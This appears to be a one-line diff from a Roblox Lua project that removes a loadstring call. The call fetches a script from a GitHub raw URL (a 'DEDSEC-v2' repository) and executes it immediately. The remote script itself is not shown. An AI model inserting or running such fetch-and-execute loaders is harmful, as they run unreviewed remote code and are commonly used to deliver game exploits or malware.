@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/fassksa4-hub/DEDSEC-v2/refs/heads/main/Emote.lua.json"))()
